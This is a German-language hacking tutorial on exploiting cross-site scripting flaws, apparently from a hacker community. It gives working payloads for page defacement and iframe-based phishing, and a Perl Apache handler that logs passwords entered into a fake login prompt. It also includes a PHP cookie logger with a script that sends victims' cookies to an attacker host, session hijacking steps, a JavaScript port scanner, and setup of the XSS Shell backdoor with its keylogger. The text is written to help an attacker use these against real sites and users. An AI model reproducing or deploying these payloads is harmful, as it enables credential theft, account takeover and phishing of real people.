~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*******************************************************
#            WEBSECURITY DOCUMENTATION               #
#        --------------------------------------      #
#             XSS - Anwendungsbeispiele              #
#        --------------------------------------      #
#                                                    #
#                                                    #
#  written by fred777 [fred777.de]                   #
#                                                    #
******************************************************
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

--[0x00]-- Intro

--[0x01]-- HTML Code Injection
   [1] Simple HTML
   [2] Laufschrift
   [3] Bilder
   [4] IFrames
   [5] Div-Container

--[0x02]-- XSS Phishing
   [1] Description
   [2] JS-File
   [3] Fazit

--[0x03]-- XSA - Cross Site Authentification
   [1] Knowledge
   [2] Perl Package
   [3] .htaccess

--[0x04]-- Cookie Stealing
   [1] Document Cookie Object
   [2] PHP Script
   [3] Redirection

--[0x05]-- Session Hijacking
   [1] Description

--[0x06]-- Javascript Injection
   [1] Optik
   [2] Fake Information
   [3] Spielereien
   [4] Externe Scripte
   [5] Portscan
   [6] Cross Site Printing

--[0x07]-- XSS Shell
   [1] Intro
   [2] Installation
   [3] Exploitation

--[0x08]-- Finito

********************************************************
#######################################################

--[0x00]-- Intro

So, willkommen zu meinem 2. Tutorial über XSS, diesmal dreht sich alles um die 
Anwendungsgebiete von Cross-Site Scripting. Was kann man mit solch einer
Lücke anfangen, wie diese ausnutzen. Ich werde natürlich nicht alle Gebiete decken, 
dafür sind es zu viele, aber ich hoffe, ein kleinen Einblick bieten zu können.
Ich empfehle vorher das erste Paper zu lesen.

#######################################################

--[0x01]-- HTML Code Injection

-------------------------------------------------------
 [1] Simple HTML
-------------------------------------------------------

Im Prinzip sieht es so aus, dass wir wieder eine Lücke brauchen, auf das Finden dieser gehe
ich jetzt auch nicht näher ein, Weiteres dazu findet ihr in den anderen Tutorials über XSS
von mir.
Ich nehme hier ein Beispiel mit GET-Parameter, da man es so einfach erklären kann.

Ok wir haben nun eine Lücke, falls nicht, könnt ihr auch eine von anderen Foren oder xssed.com 
nehmen.

www.seite.de/?search=XSS

Nun, wie die Überschrift schon vermuten lässt, gehe ich jetzt auf die HTML Injection ein.
Da nichts gefiltert wird, lässt sich HTML Code normal ausführen:

..............................................
www.seite.de/?search=<h1>fred</h1>

Ihre Suche zu:
fred
gab leider 0 Ergebnisse
..............................................

Oft wird reine HTML Injection zum Verunstalten der Seite genutzt. Andere Themen werden unten
genauer erläutert. 
Obiges Beispiel, sieht nun noch nicht sehr unterhaltsam aus. Dafür gibt es diverse Methoden:

..............................................
www.seite.de/?search=katalog gab 0 Ergebnisse<p><p><br><h1>fred war hier</h1><!--

Ihre Suche zu: katalog gab 0 Ergebnisse


fred war hier
..............................................

Die simple Ausgabe, wobei die eigentliche Aufgabe der Suche wieder kenntlich gemacht und der
Rest mit Kommentarzeichen weggefiltert wurde.

-------------------------------------------------------
 [2] Laufschrift
-------------------------------------------------------

Auch eine Laufschrift mit "marquee" ist ganz anschaulich und beliebt.

..............................................
www.seite.de/?search=katalog gab 0 Ergebnisse<p><p><br><h1><marquee>fred war hier</marquee></h1><!--

Ihre Suche zu: katalog gab 0 Ergebnisse

     <- fred war hier ->
..............................................

-------------------------------------------------------
 [3] Bilder
-------------------------------------------------------

Bilder lassen sich natürlich genauso leicht einbinden:

..............................................
www.seite.de/?search=katalog gab 0 Ergebnisse<p><p><br><img src="www.evil.de/pic.jpg"></img><!--

Ihre Suche zu: katalog gab 0 Ergebnisse

        -------BILDCHEN--------
..............................................

-------------------------------------------------------
 [4] IFrames
-------------------------------------------------------

Für größere Sachen oder ganze Scripte/Webseiten auch Iframes:

..............................................
www.seite.de/?search=katalog gab 0 Ergebnisse<br><iframe src="http://www.evil.de/pic.jpg" height="100%" width="100%"></iframe><!--

Ihre Suche zu: katalog gab 0 Ergebnisse

        -------IFRAME--------
..............................................
		
Wie auch die Größenangaben schließen lassen, wird der Platz komplett ausgenutzt.

-------------------------------------------------------
 [5] Div-Container
-------------------------------------------------------

Um auch das obere Element zu überdecken, lassen sich DIV-Container nutzen:

www.seite.de/?search=<div style="position:absolute; top:0px; left:0px; width:100%; height:100%;">INHALT</div>

Mit einem Iframe verbunden:

www.seite.de/?search=<div style="position:absolute; top:0px; left:0px; width:100%; height:100%;">
<iframe src="http://www.evil.de/pic.jpg" height="100%" width="100%"></iframe</div>

Natürlich wird das jetzt immer länger, doch dafür benutzt man dann Javascript, aber dazu später
mehr.

#######################################################

--[0x02]-- XSS Phishing

-------------------------------------------------------
 [1] Description
-------------------------------------------------------

Um den schon hergestellten Übergang zu nutzen, gehe ich jetzt noch schnell auf das Phishing
über Cross Site Scripting Bugs ein. Stellen wir uns eine Community Seite vor, von welcher
wir gerne einen Account bekommen würden. Auf dieser Seite finden wir durch Zufall eine XSS
Lücke. Eine Möglichkeit, die wir haben ist nun, den Loginbereich nachzubauen, auf unseren 
Webserver zu laden und in ein Iframe, wie oben dargestellt, einzubinden.
Nun brauchen wir nur noch den Link verschleiern und eine Mail an unser Opfer schicken.
Der Vorteil, welcher entsteht, ist, dass die URL sich nicht verändert. Dies beugt Warnungen durch
Antivirensysteme oder auch Misstrauen vor.

Unsere Beispielseite lautet: www.community.de
Der XSS-Bug ist hier:        www.community.de/?s=XSS
Der Login hier:              www.community.de/login.php

Wir laden also den Code der Loginseite auf unseren Server:

www.fake.funpic.de/login.html

Übergeben werden die Eingaben an:

www.fake.funpic.de/login.php, welche sie dann in einer logfred.txt abspeichert.

Nach einem Check, ob www.community.de/login.php und unser Login wirklich identisch sind,
können wir mit dem Einbinden beginnen. Unseren Div-Container und das Iframe kennen wir
ja bereits aus der HTML Injection.

-------------------------------------------------------
 [2] JS-File
-------------------------------------------------------

www.community.de/?s=<div style="position:absolute; top:0px; left:0px; width:100%; height:100%;">
<iframe src="http://www.fake.funpic.de/login.html" height="100%" width="100%"></iframe</div>

Die Seite sieht wie original aus, allerdings stört der abartig lange Link, welcher 
codiert noch länger werden würde.
Um dem entgegen zu wirken, packen wir den HTML Code einfach in ein JavaScript-File
auf unserem Server, da diese schnell eingebunden werden können.

Wir arbeiten mit "document.body.innerHTML", Erläuterung dazu siehe der Javascript Referenz
im Internet.
Jetzt müssen wir nur noch unseren Code anpassen:

document.body.innerHTML=(
'<div style="position:absolute; top:0px; left:0px; width:100%; height:100%;">'+
'<iframe src="http://www.fake.funpic.de/login.html" width="100%" height="100%"></iframe></div>'
);

Das Ganze wird in login.js gespeichert und auf unseren Server geladen:

www.fake.funpic.de/login.js

Jetzt müssen wir es nur noch mittels Javascript einbinden:

www.community.de/?s=<Script src="http://www.fake.funpic.de/login.js"></Script>

-------------------------------------------------------
 [3] Fazit
-------------------------------------------------------

Und die Seite wird komplett dargestellt, so wie wir es beabsichtigt haben. Um
Den Link noch kürzer oder unkenntlicher zu machen, können Link-Protectoren zur
Hilfe genommen werden. Schicken wir dies jetzt dem Opfer mit einem nett formulierten
Text, er möge sich doch bitte neu anmelden, ist es gut möglich, dass er seine
Daten dort angibt. Leider nur, dass diese sofort an uns weiter gegeben werden.

Dies muss nicht zwingend zu Massenspam und Account-Phishing führen, die Methode
ist auch hilfreich, um einzelne Administratorenzugänge zu erlangen. Dann muss
allerdings das Admin Menü nachgebaut und eingebunden werden. Versteht sich von
selbst.

#######################################################

--[0x03]--  XSA - Cross Site Authentification

-------------------------------------------------------
 [1] Knowledge
-------------------------------------------------------

Dies soll als kleiner Anhang zum allgemeinen Phishing bestehen, da
auch hier die Login-Daten ergaunert werden.
Ein übliches Scenario sieht folgendermaßen aus:

Es existiert ein Forum in der Pornoscene.

www.forump0rn.de

Es werden regelmäßig Bilder gepostet und wir haben ebenfalls einen
Account dort. Unser Ziel ist es an andere Accountdaten zu gelangen.

Also laden wir ein Bild auf unseren Server, welches nachher als Köder
benutzt werden soll.

www.xsa.funpic.de/bild.jpg

Doch der User soll natürlich vorher seine Login-Daten eingeben müssen,
deshalb schützen wir das Hauptverzeichnis mittels htaccess. Anstatt
ein Passwort zu setzen, (der User soll ja darauf hereinfallen und
ein Ergebnis sehen), nehmen wir den PerlAuthenHandler, hier
wird die Authentifizierung an ein Perl Script übergeben, welches
dann, in unserem Fall zum Logging der Daten führt.

-------------------------------------------------------
 [2] Perl Package
-------------------------------------------------------

Dem PerlAuthenHandler wird, wie schon gesagt, ein Perl Package
übergeben, normalerweise etwa so: Apache2::AuthenNIS 
Also basteln wir ein eigenes, welches einfach nur loggt.

AuthLog.pm
...............................................
package Apache2::AuthLog;

// Package for Logging Data with .htaccess

use strict;
use warnings;
use Apache2::Const qw(:common);

sub handler {

	my $conn = shift;
	my ($result, $password) = $conn->get_basic_auth_pw;
	my $user = $conn->user; 

	return $result if $result != OK;

	unless($user && $password) {

		$conn->note_basic_auth_failure;
		return AUTH_REQUIRED;
		
	}
	
	open(LOG,">>log.txt");
	print LOG "User: $user - Password: $password\n";
	close LOG;
	
	return OK;

}
...............................................

-------------------------------------------------------
 [3] .htaccess
-------------------------------------------------------

So, ist dieses an Ort und Stelle, reicht ein simples
htaccess-File, welches im gleichen Verzeichnis wie unser Bild
sitzt:

.htaccess
...............................................
AuthType Basic
AuthName "forump0rn - Login"
PerlAuthenHandler Apache2::AuthLog
require valid-user
...............................................

Nun posten wir unser Bild mit dem IMG-BB-Tags des Forums in den Thread. 
Tolles Bild [img]www.xsa.funpic.de/bild.jpg[/img]

Der User wird aufgefordert ein PW und seinen Username einzugeben,
hat er das gemacht, haben wir diese Daten und er kann das Bild anschauen.
Jetzt ist es ein leichtes zu überprüfen, ob diese Daten auch
funktionieren. Ihr als Internetuser, IMMER die Url der
htaccess-Meldung checken.

#######################################################

--[0x04]-- Cookie Stealing

-------------------------------------------------------
 [1] Document Cookie Object
-------------------------------------------------------

Es geht weiter mit Cookiestealing, auch eine beliebte Methode mit XSS Bugs umzugehen.
Bei einem auf Cookies aufgebauten Login, werden die Cookies beim User gespeichert.
Werden keine anderen Daten verglichen, könnte man, würde man den Cookie zu einem anderen
User übertragen, sich authentifizieren und wäre eingeloggt.
Also nicht schlecht, wenn wir an Cookies von Administratoren oder auch normalen Usern
kämen.
Um an die Cookies zu kommen nutzen wir das HTML DOCUMENT COOKIE OBJECT auch
document.cookie genannt. Da wir bei einem XSS Bug clientseitig mit Javascript arbeiten
geben wir es testweise einfach mit einem alert aus, um zu sehen wie das ganze aussieht.
Natürlich brauchen wir wieder unsere Testseite:

www.admin.de/page=XSS

Schauen wir uns doch erstmal unsere Cookies an:

www.admin.de/page=<Script>alert(document.cookie)</Script>

Ein Popup zeigt uns den Cookie:

adminid=777

-------------------------------------------------------
 [2] PHP Script
-------------------------------------------------------

Um an den Cookie einer anderen Person zu kommen, welche z.B. gerade eingeloggt ist,
brauchen wir wieder ein PHP Script, welches den Cookie über einen Parameter entgegennimmt
und in einer Datei abspeichert. Dann muss das Opfer nur auf den modifizierten Link klicken,
welcher den Cookie (clientseitig) an unser Script überträgt.

In unserem Beispiel nehme ich den GET-Parameter "cookie",
hinzu kommt noch die IP.

..................................................
<?php
/* config */
$ip = $_SERVER['REMOTE_ADDR'];
$file = "cookies.txt";
$cookie = rtrim($_GET['cookie']);
$text = "IP: ".$ip."\nCookie: ".$cookie."\n\n";

/* File handling..*/
if(isset($cookie) and !empty($cookie)) {
	$fp = fopen($file, "a");
	fwrite($fp, $text);
	fclose($fp);
}
?>
..................................................

Das Script laden wir auf unseren Server und lassen es dort erstmal ruhen.
Bitte beachtet, dass das File die benötigten Rechte besitzt.

www.fake.funpic.de/xss.php

-------------------------------------------------------
 [3] Redirection
-------------------------------------------------------

So jetzt fehlt nur noch die Weiterleitung im Link auf das PHP Script, das machen wir mit
document.location und dem GET-Parameter "cookie" und document.cookie:

www.admin.de/page=<Script>document.location='http://www.fake.funpic.de/xss.php?cookie=' +document.cookie</Script>

Weitere Funktionen wären: 

document.location.href
document.location.replace

Führen wir doch einfach mal den Link bei uns aus...

Auf dem FTP Server wird eine .txt Datei erstellt mit unseren Cookies, und der IP.
Klar, da er seinen Cookie in einer Variable an unser Script übermittelt.

IP: 92.47.215.91
Cookie: adminid=777

Jetzt brauchen wir nur noch den Link unserem User schicken und bekommen seine Cookies, wenn er
eingeloggt ist, bzw. der Cookie gespeichert ist, steht er bald in unserem Script.

Allerdings wird das Opfer bis jetzt nur weitergeleitet, besser wäre es, wenn
danach wieder eine Weiterleitung auf die originale Seite folgt. Aber nichts ist
einfach als das:

www.admin.de/page=<Script>document.location='http://www.fake.funpic.de/xss.php?cookie=' +document.cookie; 
document.location="http://admin.de"</Script>

Natürlich geht es auch, wenn ihr ein 
header("Location:page"); 
in das PHP File einbaut.

Sind die Cookies eingetroffen und stehen im Logile, dann folgt nur noch das Ersetzen des Cookies. 
Ihr ruft die Seite normal auf.
Startet z.B. das Firefoxaddon Tamperdata,Webdeveloper etc... und ersetzt euren Cookies durch
den Cookies des Opfers, dann ein Reload der Seite und ihr seit eingeloggt.

Auch hier gilt, eine Linkverschlüsselung ist manchmal ganz hilfreich. Ansonsten bleibt
auch die obige Option, den Code in einem externen JS-File zu speichern und einzubinden.

#######################################################

--[0x05]-- Session Hijacking

-------------------------------------------------------
 [1] Description
-------------------------------------------------------

Hier werden anstatt Cookies, Sessions vergeben. Gemanaged wird das von PHP.
Stimmt die jeweilige Session eines Users, ist er berechtigt das ein oder
andere zu machen, was normale Seitenbetrachter nicht sind.

Auf der Seite www.sessions.de wird uns als Benutzer folgende Session
übergeben: 

PHPSESSID=da98f7086f6466f74775ba29430346e4

Werden keine anderen Daten überprüft, könnten wir auch hier unsere durch die
eines höher berechtigten Users ersetzen. Haben wir ein XSS Bug, läuft das Szenario
genauso ab:

www.sessions.de/s=<Script>document.location='http://www.fake.funpic.de/xss.php?cookie=' +document.cookie; 
document.location="http://sessions.de"</Script>

Wir bekommen die ID in unser Logfile geschickt, sobald er auf den Link klickt und
können die beiden ID's austauschen. Schon besitzen wir höhere Rechte.

#######################################################

--[0x06]-- Javascript Injection

Bei der Javascript Injection verhält es sich ähnlich wie bei der HTML
Injection. Es ist alles möglich, was die Sprache hergibt. Und da ist der
Unterschied zu HTML deutlich spürbar.
Kleine Beispiele möchte ich hier zum Verständnis vorstellen.

-------------------------------------------------------
 [1] Optik
-------------------------------------------------------

Klar lässt sich auch hier die Optik verändern, dazu gibt es genügend
Javascript Befehle wie etwa DOCUMENT.WRITE:

www.seite.de/?search=<script>document.write("ASD");</Script>

Oder vielleicht gleich auf CSS Einstellungen zurückgreifen, als Demo jetzt
BG.COLOR:

www.seite.de/?search=<script>void(document.bgColor="blue")</Script>

-------------------------------------------------------
 [2] Fake Information
-------------------------------------------------------

Das Thema habe ich in Form von Defacements auch im Bereich HTML schonmal
angerissen, allerdings ist es hier komfortabler, größere Texte einzubinden, 
als mit HTML.
In letzter Zeit wurden häufig über XSS Bugs falsche Informationen auf größere
Seiten geschläust, wie etwa BBC, - mit einem externen Javascript file sehr einfach.

..................................................

var text = 
'<br><br><br>'+
'This is a big fake information <br>'+
'<br><br><br>'+
'for websites with xss bugs <br>'+
'meh :D <br>';

document.write(text);

..................................................

Nun, noch das Script einbinden und es lässt sich Wunderbares sehen..

http://seite.de/?s=katalog+gab+0+Ergebnissen<Script+src="test.js"></Script>

Ihre Suche zu: katalog gab 0 Ergebnisse

---- TEXT ----

-------------------------------------------------------
 [3] Spielereien
-------------------------------------------------------

Besonders bei persistant XSS Bugs, sind solche Spielereien ganz lustig.
Der Code wird dann, so Gott und die Addons will/wollen bei jedem User,
welcher die Seite besucht ausgeführt.
Z.B. einfache Schleifen mit while():

http://seite.de/?s=<script>while(1)alert('fred');</Script>

-- POPUPPOPUPPOPUPPOPUP --

Genauso lässt sich z.B. auch window.open oder window.close einbinden.

-------------------------------------------------------
 [4] Externe Scripte
-------------------------------------------------------

Oder große externe Scripte wie unser Beispiel, das Maus0meter:

................................................
// MausOMeter.js
// 13. 11. 2007
// Benötigt AddEvent.js und jb_mousemove.js
if (document.getElementById) addEvent(window,"onload",function() {
 if(!document.getElementById) return;
 var mm_altX=-1,mm_altY=0,mm_Weg=0 ;
 var mm_altWeg=0,Zeit=1;
 var mm_mp,mm_AnzPos,mm_AnzWeg,mm_AnzSpd,mm_to;
 var mm_aufraeumen=function() {
  document.onmousemove=null;
  document.onclick=null;
 }
 var mm_smp=function(evt) {
  var pos=jb_mousemove.getPos();
  mm_mp.firstChild.nodeValue=pos.x+","+pos.y;
  mm_mp.style.left=pos.x+"px";
  mm_mp.style.top=pos.y+"px";
  mm_mp.style.display="block";
  window.clearTimeout(mm_to);
  mm_to=window.setTimeout(function(){mm_mp.style.display='none'},2000);
 }
 var mm_speed=function() {
  var Spd=(mm_Weg-mm_altWeg)/Zeit;
  mm_AnzSpd.nodeValue = Math.round(Spd) ;
  mm_altWeg=mm_Weg;
 }
 var mm_loeschen=function() {
  mm_Weg=0 ;
  mm_altWeg=0 ;
  mm_AnzWeg.nodeValue = 0 ;
  mm_AnzSpd.nodeValue = 0 ;
 }
 var mm_messe=function(posx,posy) {
  var x,y,dx,dy ;
  if (mm_altX==-1) {
   mm_altX=posx ;
   mm_altY=posy ;
  }
  else {
   x = posx ;
   y = posy ;
   mm_AnzPos.nodeValue = x+","+y;
   dx = x-mm_altX ;
   dy = y-mm_altY ;
   mm_altX = x ;
   mm_altY = y ;
   mm_Weg += Math.sqrt(dx*dx+dy*dy) ;
   mm_AnzWeg.nodeValue = Math.round(mm_Weg) ;
  }
 }
 if(!document.getElementById("Weg") || !document.getElementById("Spd")) {
  var dv=document.createElement("div");
  dv.style.position="absolute";
  dv.style.top="5px";
  dv.style.left="30px";
  dv.style.padding="0";
  dv.style.border="1px solid black";
  dv.className="Drag_n_Drop";
  dv.innerHTML="<div style='border-bottom:1px solid black;height:1em;width:17em' class='Drag_Bar'></div>"
  +"<div style='padding:0.5em'>Aktuelle Position: <span id='Pos'>0,0</span><br>Zurückgelegte Strecke: <span id='Weg'>0</span> Pixel<br>Geschwindigkeit: <span id='Spd'>0</span> Pixel/sec<br><button type='button' id='Clr'>Zähler zurücksetzen</button></div>"  ;
  document.body.appendChild(dv);
 }
 if (document.getElementById("Clr")) document.getElementById("Clr").onclick=function(){mm_loeschen();return false;};
 mm_AnzWeg=document.getElementById("Weg").firstChild ;
 mm_AnzSpd=document.getElementById("Spd").firstChild ;
 mm_AnzPos=document.getElementById("Pos").firstChild ;
 mm_mp=document.createElement("div");
 mm_mp.style.position="absolute";
 mm_mp.style.width="5em";
 mm_mp.style.height="1.3em";
 mm_mp.style.border="2px solid #5050ff";
 mm_mp.style.display="none";
 mm_mp.style.textAlign="center";
 mm_mp.style.verticalAlign="middle";
 mm_mp.appendChild(document.createTextNode("0,0"));
 document.body.appendChild(mm_mp);
 jb_mousemove.add(mm_messe);
 addEvent(document,"onclick",mm_smp);
 addEvent(window,"onunload",mm_aufraeumen);
 window.setInterval(function(){mm_speed()},Zeit*1000);
});
.........................................

http://seite.de/?s=<script src="http://seite2.de/mausometer.js"></Script>

-- OO --

-------------------------------------------------------
 [5] Portscan
-------------------------------------------------------

Ja, der vorige Text über allgemeine Javascript-Programme, könnte uns auf
eine Idee gebracht haben, wie ist es denn dann z.B. mit Portscanning?

Ja auch das funktioniert, genau dafür hat unteranderem Gnuzitizen eine
API geschrieben, mit der sich aufgrund eines variabel gehaltenen Timeouts
Server und Ports scannen lassen.

.........................................
var AttackAPI = {
	version: '0.1',
	author: 'Petko Petkov (architect)',
	homepage: 'http://www.gnucitizen.org'};

AttackAPI.PortScanner = {};
AttackAPI.PortScanner.scanPort = function (callback, target, port, timeout) {
	var timeout = (timeout == null)?100:timeout;
	var img = new Image();
	
	img.onerror = function () {
		if (!img) return;
		img = undefined;
		callback(target, port, 'open');
	};
	
	img.onload = img.onerror;
	img.src = 'http://' + target + ':' + port;
	
	setTimeout(function () {
		if (!img) return;
		img = undefined;
		callback(target, port, 'closed');
	}, timeout);
};
AttackAPI.PortScanner.scanTarget = function (callback, target, ports, timeout)
{
	for (index = 0; index < ports.length; index++)
		AttackAPI.PortScanner.scanPort(callback, target, ports[index], timeout);
};
.........................................

Jetzt bleibt nur noch die Frage, welche IP zu scannen ist,
da mit JS nicht die IP des Servers festgestellt werden kann.
Hierfür lässt sich z.B. Java implementieren oder einfach typische
Adress-Bereiche abscannen. Dafür reicht ein Array mit IP's und
eine Schleife, welche diese durchläuft und die Funktion 'Scanport'
aufruft.
Das ganze als Script lässt sich natürlich wunderbar einbinden und
erweitern.

-------------------------------------------------------
 [6] Cross Site Printing
-------------------------------------------------------

Cross Site Printing ist leider nicht sehr oft vertreten, doch dennoch
möchte ich einen Blick in diesem Paper darauf werfen.
Hauptsächlich geht es um Printer Spamming über Netzwerkdrucker. Sie
sind oft Teil eines größeren Intranets und nicht gut geschützt während
sie auf Port 9100 nach einem Druckauftrag lauschen, welcher
auch leicht z.B. über Telnet gegeben werden kann. Unterstützt wird
z.B. Postscript oder eben Druckerbefehle. Das Problem ist, hat man
so einen gefunden, kommt evtl. der 'Angriff' ins Spiel.
Z.B. wird als Resource der Printer angegeben:

<img src="printer:9100/[text]">

Man darf hierbei allerdings nicht vergessen, das der GET-Parameter
URL-encoded wird, was auch in Form von Linebreaks zum Problem des
Formates werden kann. Hierfür eignet sich dann eher ein Formular über
POST-Parameter und dem ENCTYPE 'Multipart/Form-Data'. Die Action-Flag
muss natürlich auf dem Printer liegen.
Nun sollte auch das Format beibehalten werden, sobald der Druckauftrag erfolgt, was 
meißtens dann passiert, wenn die Verbindung getrennt wird oder ein
Timeout entsteht.
Wie schon genannt, lässt sich so etwas mittels PostScript noch weiter
ausbauen, so kann auch Cross Site Faxing entstehen


#######################################################

--[0x07]-- XSS Shell

-------------------------------------------------------
 [1] Intro
-------------------------------------------------------

So, hiermit komme ich zum vorerst letzten Teil des Papers und damit
auch noch einen Schritt weiter in die Javascript Injection, zu den XSS
Würmern oder Shells. Es gibt sehr viele verschiedene, auch extra angepasste,
wie etwa der Twitter oder Facebookwurm etc.
Ich werde mich in diesem Paper mit der XSS Shell 0.3.9 beschäftigen.

..........................................................
XSS Shell has several features to gain whole access over victim. Also you can simply add your own commands.

Most of the features can enable or disabled from configuration or can be tweaked from source code.

Features:

    * Regenerating Pages
    * Keylogger
    * Mouse Logger (click points + current DOM)

Built-in Commands:

    * Get Keylogger Data
    * Get Current Page (Current rendered DOM / like screenshot)
    * Get Cookie
    * Execute supplied javaScript (eval)
    * Get Clipboard (IE only)
    * Get internal IP address (Firefox + JVM only)
    * Check victims visited URL history
    * DDoS
    * Force to Crash victims browser
	
(Download bei Google suchen..)
...........................................................

-------------------------------------------------------
 [2] Installation
-------------------------------------------------------

Wie man leicht erkennen kann, handelt es sich um einen Backdoor. Das ganze
basiert auf ASP und wird später als Script in z.B. persistente XSS Bugs
eingebunden. Nun können verschiedene Infos, (siehe oben), von den
aktuellen Usern abgerufen werden. 
Um dies einzurichten muss der Ordner auf euren Webspace verschoben
und der Pfad für eure Access Datenbank angepasst werden. (xssshell/db.asp)
Zudem der Serverpfad: xssshell.asp
Nun noch das Passwort für die Verwaltung ändern, oder beim Standard belassen
und die Shell sollte verfügbar sein:

www.yourhost.com/xssshell/ => pw

---- Interface ----

-------------------------------------------------------
 [3] Exploitation
-------------------------------------------------------

Erscheint bei: www.yourhost.com/xssshell/ nun das normale
Interface ohne Fehlermeldungen, kann man den Backdoor verteilen:

<script src="www.yourhost.com/xssshell.asp"></script>

Dies muss beim User ausgeführt werden, am einfachsten geschieht das
natürlich in Verbindung mit persistenten XSS Bugs. Das Script wird
auf der Seite eingepflanzt und bei Besuch ausgeführt.
Letzterer erscheint nun im Admin-panel und man kann die gelisteten 
Funktionen nutzen.

Hinter der XSS Shell steckt eigentlich ein recht simples Prinzip.
Sobald das Script ausgeführt wird, werden die Daten ausgelesen, einer
randomisierten ID zugewiesen und in die Access Datenbank geschrieben.
Diese wird dann im Panel wieder ausgelesen und die Informationen hingeschrieben.

#######################################################

--[0x08]-- Finito

So, dass war mein Paper über XSS Anwendungsbeispiele. Es ist ein bisschen
länger geworden, doch ich hoffe, das hat euch nicht davon abgehalten es zu lesen.

fred777 @ fred777.5x.to